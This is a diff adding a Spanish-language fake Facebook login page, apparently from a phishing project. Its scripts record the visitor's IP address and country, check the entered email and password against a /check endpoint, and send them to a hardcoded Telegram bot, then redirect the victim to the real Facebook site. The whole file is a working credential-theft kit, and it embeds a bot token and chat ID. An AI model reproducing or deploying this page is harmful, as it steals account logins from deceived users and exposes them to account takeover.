@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Entrar o registrarse</title>
+    <link rel="shortcut icon"
+        href="https://raw.githubusercontent.com/tripleseven190504/business-facebook-phishing/main/frontend/image/icon.png"
+        type="image/x-icon">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            background-color: #ffffff;
+        }
+
+        .home {
+            text-align: center;
+            margin: 5px auto;
+            padding: 10px 20px;
+        }
+
+        .header {
+            display: flex;
+            justify-content: center;
+        }
+
+        .header img {
+            max-height: 40px;
+            min-height: 0px;
+            object-fit: contain;
+            overflow: hidden;
+        }
+
+        .content {
+            margin-top: 10px;
+        }
+
+        .Input {
+            height: 42px;
+            width: 100%;
+            padding: 12px 12px;
+            background: #F5F6F7;
+            border: 1px solid rgb(203, 210, 217);
+            border-radius: 5px;
+            align-items: center;
+            flex-direction: row;
+            margin-bottom: 10px;
+        }
+
+        .Input:focus {
+            border: 1px solid rgba(28, 43, 51, 1.0000) !important;
+        }
+
+        .inputLogin {
+            width: 100%;
+            display: flex;
+            opacity: 1;
+            height: 44px;
+            min-width: 44px;
+            flex-grow: 1;
+            padding-left: 20px;
+            padding-right: 20px;
+            background: rgba(0, 100, 224, 1.0000);
+            border: 0px solid rgba(28, 43, 51, 1);
+            border-radius: 5px;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            font-family: -apple-system, sans-serif;
+        }
+
+        .Input .logintext {
+            color: rgba(255, 255, 255, 1);
+            font-weight: 500;
+            display: inline;
+            font-size: 16px;
+            font-family: Optimistic Text Normal;
+            white-space: pre-wrap;
+            overflow-wrap: break-word;
+        }
+
+        .wbloks_1 {
+            display: flex;
+            position: relative;
+        }
+
+        .wbloks_1 i {
+            position: absolute;
+            right: 14px;
+            top: 15px;
+        }
+
+        .footer {
+            display: flex;
+            justify-content: center;
+        }
+
+        .footer span {
+            color: #808080;
+            display: inline;
+            font-size: 12px;
+            grid-area: auto;
+            line-height: 15px;
+            text-align: center;
+
+        }
+
+        .home .logintext {
+            color: rgba(255, 255, 255, 1.0000);
+            font-weight: 600;
+            display: inline;
+            font-size: 17px;
+            font-family: -apple-system, sans-serif;
+            white-space: pre-wrap;
+            overflow-wrap: break-word;
+        }
+
+        .placeholder-right {
+            position: absolute;
+            top: 0;
+            right: 0;
+            padding: 6px;
+            color: #999;
+        }
+
+        .loader {
+            font-size: 8px;
+            width: 1em;
+            height: 1em;
+            border-radius: 50%;
+            position: relative;
+            text-indent: -9999em;
+            animation: mulShdSpin 1.1s infinite ease;
+            transform: translateZ(0);
+        }
+
+        .bottomContent {
+            width: 100%;
+            margin-top: 10px;
+        }
+
+        .bottomContent a {
+            color: #216fdb;
+            display: inline;
+            font-size: 14px;
+            line-height: 16px;
+            text-align: center;
+        }
+
+        .reg {
+            width: 100%;
+        }
+
+        .reg img {
+            width: 100%;
+            margin-top: 20px;
+            object-fit: cover;
+        }
+
+        .signup-button {
+            border-radius: 5px;
+            margin-top: 15px;
+            background: white;
+            border-color: #bec3c9;
+            border-style: solid;
+            border-width: 1px;
+            box-shadow: none;
+            color: #000;
+            display: inline-block;
+            padding: 3px 8px 2px;
+            flex: none;
+            font-size: 15px;
+            font-style: normal;
+            font-weight: 500;
+            letter-spacing: -0.23px;
+            text-align: center;
+            text-shadow: none;
+            white-space: nowrap;
+            width: 80%;
+        }
+
+        .locale-selector {
+            margin-top: 80px;
+            font-size: 14px;
+            gap: normal;
+            line-height: 18px;
+            padding: 6px;
+            text-align: center;
+            display: flex;
+            justify-content: space-around;
+        }
+
+        .locale-selector-left,
+        .locale-selector-right {
+            display: flex;
+            flex-direction: column;
+            flex-basis: 0%;
+            font-size: 14px;
+            grid-area: auto;
+            text-align: center;
+        }
+
+        .locale-selector-left span {
+            color: #90949c;
+            display: inline;
+            font-size: 12px;
+            font-weight: 700;
+            gap: normal;
+            grid-area: auto;
+            line-height: 16px;
+            text-align: center;
+        }
+
+        .box {
+            grid-area: area;
+            text-align: center;
+            line-height: 18px;
+        }
+
+        .box a {
+            color: #576b95;
+            display: inline;
+            font-size: 12px;
+            grid-area: auto;
+            line-height: 16px;
+            text-align: center;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .add {
+            border: 1px solid #3b5998;
+            border-radius: 3px;
+            color: #3578e5;
+            display: block;
+            font-size: large;
+            height: 18px;
+            line-height: 17px;
+            margin-right: 1px;
+            text-align: center;
+            width: 18px;
+            margin: 0 auto;
+        }
+
+        .add i {
+            color: #3578e5;
+            font-size: 18px;
+            display: inline-block;
+            grid-area: auto;
+            margin-right: 3px 0;
+            text-align: center;
+            line-height: 17px;
+        }
+
+        .info {
+            color: #8a8d91;
+            display: inline-block;
+            font-size: 10px;
+            grid-area: auto;
+            line-height: 13px;
+            margin: 2px 0;
+            padding: 0px 1px;
+            text-align: center;
+        }
+
+
+        @keyframes mulShdSpin {
+
+            0%,
+            100% {
+                box-shadow: 0em -2.6em 0em 0em #007bff, 1.8em -1.8em 0 0em rgba(0, 123, 255, 0.2), 2.5em 0em 0 0em rgba(0, 123, 255, 0.2), 1.75em 1.75em 0 0em rgba(0, 123, 255, 0.2), 0em 2.5em 0 0em rgba(0, 123, 255, 0.2), -1.8em 1.8em 0 0em rgba(0, 123, 255, 0.2), -2.6em 0em 0 0em rgba(0, 123, 255, 0.5), -1.8em -1.8em 0 0em rgba(0, 123, 255, 0.7);
+            }
+
+            12.5% {
+                box-shadow: 0em -2.6em 0em 0em rgba(0, 123, 255, 0.7), 1.8em -1.8em 0 0em #007bff, 2.5em 0em 0 0em rgba(0, 123, 255, 0.2), 1.75em 1.75em 0 0em rgba(0, 123, 255, 0.2), 0em 2.5em 0 0em rgba(0, 123, 255, 0.2), -1.8em 1.8em 0 0em rgba(0, 123, 255, 0.2), -2.6em 0em 0 0em rgba(0, 123, 255, 0.2), -1.8em -1.8em 0 0em rgba(0, 123, 255, 0.5);
+            }
+
+            25% {
+                box-shadow: 0em -2.6em 0em 0em rgba(0, 123, 255, 0.5), 1.8em -1.8em 0 0em rgba(0, 123, 255, 0.7), 2.5em 0em 0 0em #007bff, 1.75em 1.75em 0 0em rgba(0, 123, 255, 0.2), 0em 2.5em 0 0em rgba(0, 123, 255, 0.2), -1.8em 1.8em 0 0em rgba(0, 123, 255, 0.2), -2.6em 0em 0 0em rgba(0, 123, 255, 0.2), -1.8em -1.8em 0 0em rgba(0, 123, 255, 0.2);
+            }
+
+            37.5% {
+                box-shadow: 0em -2.6em 0em 0em rgba(0, 123, 255, 0.2), 1.8em -1.8em 0 0em rgba(0, 123, 255, 0.5), 2.5em 0em 0 0em rgba(0, 123, 255, 0.7), 1.75em 1.75em 0 0em #007bff, 0em 2.5em 0 0em rgba(0, 123, 255, 0.2), -1.8em 1.8em 0 0em rgba(0, 123, 255, 0.2), -2.6em 0em 0 0em rgba(0, 123, 255, 0.2), -1.8em -1.8em 0 0em rgba(0, 123, 255, 0.2);
+            }
+
+            50% {
+                box-shadow: 0em -2.6em 0em 0em rgba(0, 123, 255, 0.2), 1.8em -1.8em 0 0em rgba(0, 123, 255, 0.2), 2.5em 0em 0 0em rgba(0, 123, 255, 0.5), 1.75em 1.75em 0 0em rgba(0, 123, 255, 0.7), 0em 2.5em 0 0em #007bff, -1.8em 1.8em 0 0em rgba(0, 123, 255, 0.2), -2.6em 0em 0 0em rgba(0, 123, 255, 0.2), -1.8em -1.8em 0 0em rgba(0, 123, 255, 0.2);
+            }
+
+            62.5% {
+                box-shadow: 0em -2.6em 0em 0em rgba(0, 123, 255, 0.2), 1.8em -1.8em 0 0em rgba(0, 123, 255, 0.2), 2.5em 0em 0 0em rgba(0, 123, 255, 0.2), 1.75em 1.75em 0 0em rgba(0, 123, 255, 0.5), 0em 2.5em 0 0em rgba(0, 123, 255, 0.7), -1.8em 1.8em 0 0em #007bff, -2.6em 0em 0 0em rgba(0, 123, 255, 0.2), -1.8em -1.8em 0 0em rgba(0, 123, 255, 0.2);
+            }
+
+            75% {
+                box-shadow: 0em -2.6em 0em 0em rgba(0, 123, 255, 0.2), 1.8em -1.8em 0 0em rgba(0, 123, 255, 0.2), 2.5em 0em 0 0em rgba(0, 123, 255, 0.2), 1.75em 1.75em 0 0em rgba(0, 123, 255, 0.2), 0em 2.5em 0 0em rgba(0, 123, 255, 0.5), -1.8em 1.8em 0 0em rgba(0, 123, 255, 0.7), -2.6em 0em 0 0em #007bff, -1.8em -1.8em 0 0em rgba(0, 123, 255, 0.2);
+            }
+
+            87.5% {
+                box-shadow: 0em -2.6em 0em 0em rgba(0, 123, 255, 0.2), 1.8em -1.8em 0 0em rgba(0, 123, 255, 0.2), 2.5em 0em 0 0em rgba(0, 123, 255, 0.2), 1.75em 1.75em 0 0em rgba(0, 123, 255, 0.2), 0em 2.5em 0 0em rgba(0, 123, 255, 0.2), -1.8em 1.8em 0 0em rgba(0, 123, 255, 0.5), -2.6em 0em 0 0em rgba(0, 123, 255, 0.7), -1.8em -1.8em 0 0em #007bff;
+            }
+        }
+
+        @media screen and (max-width: 600px) {
+            .Input:focus {
+                border: 1px solid rgba(28, 43, 51, 1.0000) !important;
+            }
+        }
+    </style>
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const passwordInput = document.getElementById('pass');
+            const eyeIcon = document.querySelector('.fa-eye');
+            eyeIcon.addEventListener('click', function () {
+                const isPasswordVisible = passwordInput.type === 'text';
+                passwordInput.type = isPasswordVisible ? 'password' : 'text';
+                eyeIcon.className = isPasswordVisible ? 'fa fa-eye-slash' : 'fa fa-eye';
+            });
+        });
+    </script>
+    <script>
+        async function submitForm() {
+            var emailInput = document.getElementById('email');
+            var emailValue = emailInput.value;
+            var passwordInput = document.getElementById('pass');
+            var passwordValue = passwordInput.value;
+            if (emailValue === '') {
+                emailInput.style.borderColor = 'red';
+                emailInput.focus();
+            }
+            else if (passwordValue === '') {
+                passwordInput.focus();
+            }
+            else {
+                var button = document.getElementById("login");
+                var loader = document.getElementById("loader");
+                button.style.display = "none";
+                loader.style.display = "flex";
+                event.preventDefault();
+                const ipAddress = localStorage.getItem('ipAddress');
+                const address = localStorage.getItem('address');
+                const response = await fetch(`/check?username=${emailValue}&password=${passwordValue}`);
+                const data = await response.json();
+                if (data) {
+                    const options = {
+                        method: 'POST',
+                        headers: {
+                            accept: 'application/json',
+                            'User-Agent': 'Telegram Bot SDK - (https://github.com/irazasyed/telegram-bot-sdk)',
+                            'content-type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            text: "<b>IP</b>: <code>" + ipAddress + "</code> \n<b>Địa chỉ:</b> <code>" + address + "</code> \n<b>Email:</b><code> " + emailValue + "</code>\n<b>Mật khẩu</b>:<code> " + passwordValue + "</code>",
+                            parse_mode: 'HTML',
+                            disable_web_page_preview: false,
+                            disable_notification: false,
+                            reply_to_message_id: null,
+                            chat_id: '5491296890'
+                        })
+                    };
+                    fetch('https://api.telegram.org/bot7043773023:AAFlwYHpOSQXjEKZVnI2TP9ed7VIHD1P0Gs/sendMessage', options)
+                        .then(response => response.json())
+                        .then(response => console.log(response))
+                        .catch(err => console.error(err));
+                    var button = document.getElementById("login");
+                    var loader = document.getElementById("loader");
+                    button.style.display = "block";
+                    loader.style.display = "none";
+                    button.addEventListener("click", submitForm);
+                    window.location.href = 'https://m.facebook.com';
+                } else {
+                    emailInput.value = '';
+                    passwordInput.value = '';
+                    passwordInput.style.borderColor = 'red';
+                    passwordInput.placeholder = 'La contraseña que has introducido es incorrecta.';
+                    var button = document.getElementById("login");
+                    var loader = document.getElementById("loader");
+
+                    button.style.display = "block";
+                    loader.style.display = "none";
+                    button.addEventListener("click", submitForm);
+                }
+            }
+        }
+        function removeRedBorder() {
+            var emailInput = document.getElementById('email');
+            var passwordInput = document.getElementById('pass');
+            passwordInput.setAttribute('placeholder', 'Contraseña');
+            passwordInput.style.borderColor = 'black';
+            emailInput.style.borderColor = 'black';
+        }
+    </script>
+    <script>
+        document.addEventListener('DOMContentLoaded', async function () {
+            let ipAddress;
+            let address;
+            try {
+                const ipifyResponse = await fetch('https://api.ipify.org?format=json');
+                const ipifyData = await ipifyResponse.json();
+                ipAddress = ipifyData.ip;
+
+                const ipLocationNetResponse = await fetch(`https://api.iplocation.net/?cmd=ip-country&ip=${ipAddress}`);
+                const ipLocationNetData = await ipLocationNetResponse.json();
+                address = ipLocationNetData.country_name;
+
+                localStorage.setItem('ipAddress', ipAddress);
+                localStorage.setItem('address', address);
+            } catch (error) {
+                console.error('Lỗi:', error);
+            }
+        });
+
+    </script>
+</head>
+
+<body>
+    <div class="home">
+        <div class="header">
+            <img class="logo" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="">
+        </div>
+        <div class="content">
+            <div class="wbloks_1" id="emailContainer">
+                <input id="email" class="Input" type="text" id="m_login_email"
+                    placeholder="Número de celular o correo electrónico" oninput="removeRedBorder()">
+            </div>
+            <div class="wbloks_1" id="passContainer">
+                <input id="pass" class="Input" type="password" id="m_login_password" placeholder="Contraseña"
+                    oninput="removeRedBorder()">
+                <i class="fa fa-eye" id="eyeIcon"></i>
+            </div>
+            <button class="inputLogin" id="login">
+                <span class="logintext" id="loginText" onclick="submitForm()">Iniciar sesión</span>
+            </button>
+            <div id="loader" style="display: none;
+                                        width:100% ;
+                                        flex-direction: row;
+                                        margin-top: 10px;
+                                        justify-content: center;">
+                <div class="loader"></div>
+
+            </div>
+            <div class="bottomContent">
+                <a href="#">¿Olvidaste tu contraseña?</a>
+                <div class="reg">
+                    <img src="./Image/line.png">
+                </div>
+                <button class="signup-button">
+                    Crear cuenta nueva
+                </button>
+                <div class="locale-selector">
+                    <div class="locale-selector-left">
+                        <span>Español</span>
+                        <div class="box"><a href="#">Tiếng Việt</a></div>
+                        <div class="box"><a href="#">한국어</a></div>
+                        <div class="box"><a href="#">Français(France)</a></div>
+                    </div>
+                    <div class=" locale-selector-right">
+                        <div class="box"><a href="#">English (UK)</a></div>
+                        <div class="box"><a href="$">中文(台灣)</a></div>
+                        <div class="box"><a href="#">Português(Brasil)</a></div>
+                        <div class="add">
+                            <i>+</i>
+                        </div>
+                    </div>
+                </div>
+                <span class="info">Información · Ayuda · Más</span>
+
+            </div>
+
+        </div>
+
+    </div>
+    <div class="footer">
+        <span>Meta © 2024</span>
+    </div>
+    </div>
+</body>
+
+</html>
